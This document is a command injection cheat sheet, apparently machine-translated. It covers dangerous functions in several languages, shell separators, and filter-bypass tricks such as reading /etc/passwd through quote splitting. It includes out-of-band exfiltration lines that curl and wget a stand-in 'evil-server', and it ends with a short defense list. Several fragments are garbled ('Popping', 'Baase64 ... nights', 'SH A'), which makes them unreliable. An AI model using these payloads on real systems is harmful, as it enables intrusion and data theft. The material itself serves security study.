Command Injection
========================================

Introduction
----------------------------------------
Command injection usually refers to vulnerabilities caused by web applications splicing system commands on the server.

This type of vulnerability usually occurs when calling external programs to complete some functions. For example, some web management interfaces can configure hostname/IP/mask/gateway, view system information, and turn off restart functions, or some sites provide functions such as ping, nslookup, providing sending emails, converting pictures, etc., which may occur.

Common hazard functions
----------------------------------------

PHP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- system
- exec
- passthru
- shell_exec
- Popping
- proc_open

Python
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- system
- Popping
- subprocess.call
- spawn

Java
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- java.lang.Runtime.getRuntime().exec(command)

Common injection methods
----------------------------------------
- Semicolon segmentation
-`||```&&````&`` split
- ``|`` Pipeline symbol
- ``
```%d0%a0``
- Backtick parsing
- ``$()``` Replace

No echo skills
----------------------------------------
- bash rebound shell
- DNS out-of-band data
- http out of band
- ``curl http://evil-server/$(whoami)``
- ``wget http://evil-server/$(whoami)``
- Use ``sleep`` or other logic to construct Boolean conditions when out of band

Common ways to bypass
----------------------------------------

Space bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``<`` symbol ``cat<123``
- ``	`` / ``%09``
- ``${IFS}`` where {} is used to truncate, such as cat$IFS2 will be considered as IFS2 as a variable name. In addition, adding $ afterward can play a truncation role. $9 is generally used, because $9 is the holder of the ninth parameter of the current system shell process, and it is always an empty string

Blacklist bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``a=l;b=s;$a$b``
- Baase64 '| Base64 -d nights
- ``/?in/?s`` => ``/bin/ls``
- Connector ``cat /etc/pass'w'd``
- Undefined initialization variable ``cat$x /etc/passwd``

Length limit bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

>wget\
>foo.\
>com
ls -t>a
SH A

The above method is to redirect the write command through the command line, then write the command to the file by ordering ls by time, and finally execute
If you execute it directly in the Linux terminal, creating a file requires adding commands before redirecting the symbol.
Here you can use some short commands such as w,[, (use ls /usr/bin/? View)
If you do not add commands, Ctrl+D is required to end, which is equivalent to the redirection of the standard input stream
In php, when using shell_exec to execute system commands, there is no standard input stream, so you can create files directly

Common symbols
----------------------------------------

Command separator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `` `%0` `` ``%0 d `
,,
- ``;``
- ``&`` / ``&&``

Wildcard
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``*`` 0 to infinite any character
- ``?`` A random character
- ``[ ]`` A character in brackets, e.g. ``[abcd]``
- ``[ - ]`` All characters in the encoding order
- ``[^ ]`` A character not in brackets

defense
----------------------------------------
- Disable the corresponding function when not in use
- Try not to execute external applications or commands
- Check the format of input
- Escape all shell metacharacters in command
- shell metacharacters include ``#&;`,|*?~<>^()[]{}$\``
